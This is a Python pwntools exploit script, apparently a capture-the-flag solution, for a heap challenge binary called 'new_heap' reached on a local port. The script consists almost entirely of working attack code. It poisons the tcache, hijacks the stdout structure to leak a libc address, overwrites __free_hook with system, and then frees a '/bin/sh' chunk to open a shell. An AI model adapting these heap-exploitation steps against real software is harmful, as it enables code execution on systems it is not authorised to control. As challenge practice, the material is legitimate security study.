#!/usr/bin/python2
# -*- coding:utf-8 -*-

from pwn import *
import os
import struct
import random
import time
import sys
import signal

def clear(signum=None, stack=None):
    print('Strip  all debugging information')
    os.system('rm -f /tmp/gdb_symbols* /tmp/gdb_pid /tmp/gdb_script')
    exit(0)

for sig in [signal.SIGINT, signal.SIGHUP, signal.SIGTERM]: 
    signal.signal(sig, clear)

# # Create a symbol file for GDB debugging
# try:
#     gdb_symbols = '''

#     '''

#     f = open('/tmp/gdb_symbols.c', 'w')
#     f.write(gdb_symbols)
#     f.close()
#     os.system('gcc -g -shared /tmp/gdb_symbols.c -o /tmp/gdb_symbols.so')
#     # os.system('gcc -g -m32 -shared /tmp/gdb_symbols.c -o /tmp/gdb_symbols.so')
# except Exception as e:
#     pass

context.arch = 'amd64'
# context.arch = 'i386'
# context.log_level = 'debug'
execve_file = './new_heap'
# execve_file = './new_heap'
# sh = process(execve_file, env={'LD_PRELOAD': '/tmp/gdb_symbols.so'})
# sh = process(execve_file)
sh = remote('localhost', 1000)
elf = ELF(execve_file)
# libc = ELF('./libc-2.29.so')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Create temporary files for GDB debugging
try:
    gdbscript = '''
    def pr
        x/18gx $rebase(0x202060)
        end
    b malloc
    '''

    f = open('/tmp/gdb_pid', 'w')
    f.write(str(proc.pidof(sh)[0]))
    f.close()

    f = open('/tmp/gdb_script', 'w')
    f.write(gdbscript)
    f.close()
except Exception as e:
    pass

def add(size, content):
    sh.sendlineafter('3.exit\n', '1')
    sh.sendlineafter('size:', str(size))
    sh.sendafter('content:', content)

def delete(index):
    sh.sendlineafter('3.exit\n', '2')
    sh.sendlineafter('index:', str(index))

def local_exit(content):
    sh.sendlineafter('3.exit\n', '3')
    sh.sendafter('sure?\n', content)

def clear_exit_buf(num):
    for i in range(num):
        local_exit('')


sh.recvuntil('s:')
high = (int(sh.recvline(), 16) - 2) * 0x100
log.success('high: ' + hex(high))


for i in range(9):
    add(0x28, '\n')
    
for i in range(9):
    delete(i)

add(0x28, '\n')

local_exit('a' * 0x28 + p8(0x31) + '\0\0')
# pause()
delete(8) # hijack tcache
clear_exit_buf(0x28 + 2)

local_exit('a' * 0x28 + p64(0x31) + p16(high + 0x10))
add(0x28, '\n')
add(0x28, '\0' * 0x20 + '\xff' * 0x8)

# hijack tcache
delete(11)
add(0x48, '\0' * 0x10)
add(0x18, p16(0xe760)) # Let tcache point at stdout

# pause()
add(0x38, p64(0xfbad2887 | 0x1000) + p64(0) * 3 + p8(0xc8)) # hijack stdout
result = sh.recvn(8)
libc_addr = u64(result) - libc.symbols['_IO_2_1_stdin_']
log.success('libc_addr: ' + hex(libc_addr))

# again
delete(8)
clear_exit_buf(0x28 + 8 + 2 - 1)
local_exit('a' * 0x28 + p64(0x31) + p64(libc_addr + libc.symbols['__free_hook']))

add(0x28, '/bin/sh\0')
add(0x28, p64(libc_addr + libc.symbols['system'])) # hijack __free_hook

delete(15)

sh.interactive()
clear()